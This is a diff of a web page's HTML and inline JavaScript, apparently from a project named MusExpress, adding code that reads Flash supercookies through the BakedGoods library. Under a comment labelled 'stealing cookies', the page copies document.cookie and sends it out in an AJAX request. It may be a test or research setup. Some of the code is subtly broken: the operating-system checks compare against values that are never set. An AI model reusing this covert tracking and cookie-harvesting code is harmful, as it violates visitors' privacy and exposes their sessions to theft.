@@ -7,56 +7,13 @@
 <head>
 <script type="text/javascript"
 	src="/MusExpress/js/lib/jquery-3.1.1.min.js"></script>
+<script type="text/javascript" src="bg.js">
+</script>
 </head>
 <body>
 	<img src="../images/loader.gif">
 	<script>
-	/*
-	*web tracking with Flah FLOs
-	*/
-	var lso_value;
-	
-	 
-	function init() {
-	    var so = new swfobject.embedSWF("pd_check.swf", "pd_check", "1", "1", "9.0.0");
-	    so.write("flash_container");
-	}
-	 
-	function getFlashMovie( movieName ) {
-	    var isIE = navigator.appName.indexOf("Microsoft") != -1;
-	    return (isIE) ? window[movieName] : document[movieName];
-	}
-	 
-	function requestLSOValue() {
-	    getFlashMovie('pd_check').requestLSOValue();
-	}
-	 
-	function updateLSOValue( value ) {
-	    lso_value = value;
-	}
-	 
-	function setLSOValue( value ) {
-	    getFlashMovie('pd_check').setLSOValue( value );
-	}
-	//get FLOS
-	//transform FLOS into cookies
-	/*
-	var local2 = ExternalInterface.call('getCookie', 'guid');
-		console.log(local2);
-	if (local2 == undefined) {
-		local2 = getComputerguidFromFSO();
-		console.log(local2);
-		if (local2 != undefined) {
-			flash.external.ExternalInterface.call('setCookie','guid', local2);
-			console.log(document.cookie);
-		}	
-	}
-	else {
-		setComputerguidInFSO(local2);
-		}
-	*/
-	/*
-	*stealing cookies
+	/**creating cookies for tests
 	*/
 	function setCookie(cname, cvalue, exdays) {
 	    var d = new Date();
@@ -64,10 +21,57 @@
 	    var expires = "expires="+ d.toUTCString();
 	    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
 	} 
+	/*
+	*web tracking with Flah FLOs with BackedGoods library availabe explanatio on:
+	* https://github.com/klawson88/Baked-Goods
+	* using the getAll() function
+	*/
+	//testing with one flos
+	bakedGoods.set({
+	    data: [{key: "keyTestFlos", value: "valueTestFlos"}],
+	    storageTypes: ["flash"],
+	    complete: function(byStorageTypeRemovedItemKeysObj, byStorageTypeErrorObj){}
+	});
+	//cheking if OS is windows, linux or apple:
+	var OSName="Unknown OS";
+	if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+	if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+	if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+	if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+
+	console.log('Your OS: '+OSName);
+	var flashOptionsObj; 
+	if(OSName == "Win"){
+		flashOptionsObj = {storageType: window.PERSISTENT,directoryPath: '%APPDATA%MacromediaFlash Player#SharedObjects'}
+	}else if(OSName == "Mac"){
+		flashOptionsObj = {storageType: window.PERSISTENT,directoryPath: '~/Library/Preferences/Macromedia/Flash Player/#SharedObjects/'}
+	}else if(OSName == "X11" ){
+		var flashOptionsObj = {storageType: window.PERSISTENT,directoryPath: '~/.macromedia/Flash_Player/macromedia.com/support/flashplayer/sys/ '}
+	}else if(OSName == "Linux"){
+		var flashOptionsObj = {storageType: window.PERSISTENT,directoryPath: '~/.macromedia/Flash_Player/macromedia.com/support/flashplayer/sys/ '}
+	}else{
+		var flashOptionsObj = {storageType: window.PERSISTENT,directoryPath: ''}
+	}
+	
+	var optionsObj = {flash: flashOptionsObj}
+	//Without comments
+	var allFlos = bakedGoods.getAll({
+	    storageTypes: ["flash"],
+	    options: optionsObj,
+	    complete: function(byStorageTypeResultDataObj, byStorageTypeErrorObj){}
+	});
+	
+	console.log(allFlos);
+
+	
+	/*
+	*stealing cookies
+	*/
+	
 	setCookie("test","testSansHttpOnly",2);
 	//copie cookies into variable cookies
 	var cookies = document.cookie;
-	console.log('cookie: ' + cookies);
+	//console.log('cookie: ' + cookies);
 
 	function listCookies() {
 	    var theCookies = document.cookie.split(';');
@@ -84,9 +88,8 @@
 		data : cookies,
 	
 		dataType : "json",
-		success : function(data) { 
+		success : function(data, status, xhr) { 
 			console.log(data.message);
-			console.log(data.cookies);
 			console.log('after cookie: ' +  listCookies());
 		},
 		error : function(XHR, testStatus, errorThrown) 
